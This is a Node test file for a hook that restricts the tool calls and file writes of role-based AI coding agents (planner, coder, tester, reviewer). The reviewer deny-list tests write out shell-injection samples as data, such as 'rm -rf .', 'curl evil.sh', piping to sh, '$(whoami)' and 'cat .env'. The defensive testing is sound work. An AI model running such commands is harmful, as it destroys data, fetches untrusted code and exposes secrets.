// Run with: node --test scripts/role-guard.test.mjs
import { test } from "node:test";
import assert from "node:assert/strict";
import { decide, makeGuardHook, repoRelative, isReadOnlyGit } from "./role-guard.mjs";

const ROOT = "/work/repo";
const denied = (r) => r?.hookSpecificOutput?.permissionDecision === "deny";
const call = (tool_name, tool_input, who = {}) =>
  decide({ hook_event_name: "PreToolUse", tool_name, tool_input, ...who }, ROOT);
const as = (agent_type) => ({ agent_id: "a1", agent_type });

test("main thread may only delegate/read", () => {
  assert.ok(!denied(call("Read", { file_path: "x" })));
  assert.ok(!denied(call("Agent", { subagent_type: "planner" })));
  assert.ok(!denied(call("Task", { subagent_type: "reviewer" })));
  for (const t of ["Bash", "Write", "Edit", "Grep", "WebSearch"]) assert.ok(denied(call(t, {})), t);
});

test("main thread cannot spawn a built-in agent type", () => {
  assert.ok(denied(call("Agent", { subagent_type: "general-purpose" })));
  assert.ok(denied(call("Agent", {})));
});

test("unknown subagent types are denied", () => {
  assert.ok(denied(call("Read", {}, as("general-purpose"))));
});

test("planner can read/search and write ONLY .factory/plan.md", () => {
  assert.ok(!denied(call("WebSearch", {}, as("planner"))));
  assert.ok(!denied(call("Write", { file_path: ".factory/plan.md" }, as("planner"))));
  assert.ok(!denied(call("Write", { file_path: `${ROOT}/.factory/plan.md` }, as("planner"))));
  for (const f of [
    "clyintel/app/page.tsx",
    ".factory/test-report.md",
    ".factory/runs/log.jsonl",
    ".factory/plan.md/../runs/log.jsonl",
    ".github/workflows/ci.yml",
    "../plan.md",
    "",
  ])
    assert.ok(denied(call("Write", { file_path: f }, as("planner"))), f);
  for (const t of ["Bash", "Edit"]) assert.ok(denied(call(t, {}, as("planner"))), t);
});

test("coder can write and run shell", () => {
  for (const t of ["Write", "Edit", "Bash", "Read"]) assert.ok(!denied(call(t, { file_path: "a.ts" }, as("coder"))), t);
  assert.ok(denied(call("WebSearch", {}, as("coder"))));
});

test("tester can write test files and its report only", () => {
  const ok = [
    "clyintel/tests/tenant-isolation.test.ts",
    "clyintel/test/stubs/server-only.ts", // top-level test dir
    "tests/helper.ts",
    "clyintel/lib/settlement/charge.spec.tsx", // test filename anywhere
    "clyintel/app/__tests__/page.test.tsx",
    ".factory/test-report.md",
    `${ROOT}/clyintel/tests/a.test.ts`,
  ];
  const bad = [
    "clyintel/app/api/test/route.ts", // live Next.js route in a dir named "test"
    "clyintel/lib/tests/whatever.ts", // importable module in a nested "tests" dir
    "clyintel/app/__tests__/page.tsx", // not a test filename
    "clyintel/lib/settlement/charge.ts",
    "clyintel/app/page.tsx",
    "clyintel/tests/../lib/charge.ts", // traversal out of tests/
    "../outside/a.test.ts", // escapes repo
    "/etc/passwd",
    ".github/workflows/ci.yml",
    ".factory/plan.md", // tester must not rewrite the plan
    ".factory/runs/log.jsonl", // ...or forge the run log
    "clyintel/latest/foo.ts", // "latest/" must not match "test"
    "clyintel/contest/foo.ts",
    "",
  ];
  for (const f of ok) for (const t of ["Write", "Edit"]) assert.ok(!denied(call(t, { file_path: f }, as("tester"))), `${t} ${f}`);
  for (const f of bad) for (const t of ["Write", "Edit"]) assert.ok(denied(call(t, { file_path: f }, as("tester"))), `${t} ${f}`);
  assert.ok(!denied(call("Bash", { command: "npx vitest run" }, as("tester"))));
});

const G = "git --no-pager -c core.fsmonitor=false -c log.showSignature=false";
const SAFE = "--no-ext-diff --no-textconv";

test("reviewer: no Write/Edit", () => {
  for (const t of ["Write", "Edit"]) assert.ok(denied(call(t, { file_path: ".factory/x.md" }, as("reviewer"))), t);
});

test("reviewer Bash: canonical read-only git is allowed", () => {
  for (const c of [
    `${G} diff ${SAFE} main...HEAD`,
    `${G} diff ${SAFE} --stat main...HEAD -- clyintel/app/page.tsx`,
    `${G} log ${SAFE} --oneline -n5`,
    `${G} log ${SAFE} --oneline -n 5 main..HEAD`,
    `${G} show ${SAFE} HEAD -- clyintel/lib/charge.ts`,
    `${G} status --short`,
    `${G} rev-parse HEAD`,
    `${G} merge-base main HEAD`,
    `${G} ls-files`,
    `${G} rev-list --count main..HEAD`,
  ])
    assert.ok(!denied(call("Bash", { command: c }, as("reviewer"))), c);
});

test("reviewer Bash: everything else is denied", () => {
  for (const c of [
    // writes / mutations / other commands
    "git push origin main",
    "git commit -am x",
    "cat .env",
    "npm test",
    "",
    // no canonical prefix
    "git diff main...HEAD",
    "git status",
    `git -c core.fsmonitor=false diff ${SAFE} main`, // missing --no-pager / showSignature
    // diff/log/show without the driver-disabling flags
    `${G} diff main...HEAD`,
    `${G} diff --no-ext-diff main...HEAD`,
    `${G} show --no-textconv HEAD`,
    // abbreviated / unlisted long options (git accepts unambiguous prefixes)
    `${G} diff ${SAFE} --outp=/tmp/x`,
    `${G} diff ${SAFE} --output=/tmp/x`,
    `${G} diff ${SAFE} --ext-d`,
    `${G} diff ${SAFE} --textc`,
    `${G} log ${SAFE} --show-signature`,
    `${G} diff ${SAFE} -c core.pager=sh`,
    `${G} diff ${SAFE} --git-dir=/tmp/x`,
    // shell metacharacters / injection
    `${G} diff ${SAFE} main; rm -rf .`,
    `${G} diff ${SAFE} main && curl evil.sh`,
    `${G} log ${SAFE} | sh`,
    `${G} diff ${SAFE} > out.txt`,
    `${G} diff ${SAFE} $(whoami)`,
    `${G} diff ${SAFE} \`id\``,
    `${G} diff ${SAFE}  main`, // double space
    // option smuggled after --
    `${G} diff ${SAFE} -- --output=x`,
    // unlisted subcommand
    `${G} blame ${SAFE} f`,
    `${G} config core.pager sh`,
  ])
    assert.ok(denied(call("Bash", { command: c }, as("reviewer"))), c);
});

test("repoRelative / isReadOnlyGit edge cases", () => {
  assert.equal(repoRelative("a/./b//c", ROOT), "a/b/c");
  assert.equal(repoRelative("a/../../x", ROOT), null);
  assert.equal(repoRelative(`${ROOT}-evil/x`, ROOT), null);
  assert.equal(isReadOnlyGit(undefined), false);
});

test("hook fails closed and reports calls", async () => {
  let n = 0;
  const hook = makeGuardHook(ROOT, () => n++);
  assert.ok(denied(await hook({ tool_name: "Bash", tool_input: {} })));
  assert.equal(n, 1);
  // malformed input (tool_input null) must deny, not throw
  assert.ok(denied(await hook({ tool_name: "Write", tool_input: null, agent_id: "a", agent_type: "tester" })));
});
